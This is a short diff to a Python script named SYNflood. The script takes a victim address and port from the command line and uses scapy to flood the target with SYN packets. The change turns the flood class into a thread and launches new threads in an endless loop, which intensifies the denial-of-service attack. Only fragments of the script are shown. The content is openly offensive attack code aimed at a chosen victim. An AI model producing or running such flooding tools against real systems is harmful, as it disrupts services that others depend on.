@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #author Aiden
 
-import socket, random, sys,re 
+import socket, random, sys,re ,threading
 from scapy.all import *
 
 if len(sys.argv) != 3:
@@ -9,9 +9,9 @@ if len(sys.argv) != 3:
 	sys.exit(1) 
 victim = sys.argv[1]
 port = int(sys.argv[2])
-sys.tracebacklimit=0
 
-class SYNflood:
+
+class SYNflood(threading.Thread):
 	try:
 		def check(self):
 			global target,victim
@@ -48,6 +48,6 @@ class SYNflood:
 	except:
 		print 'Victim not available!'
 		sys.exit(1)
-syn = SYNflood()
+
 while True:
-	syn.run()
+	SYNflood().start()
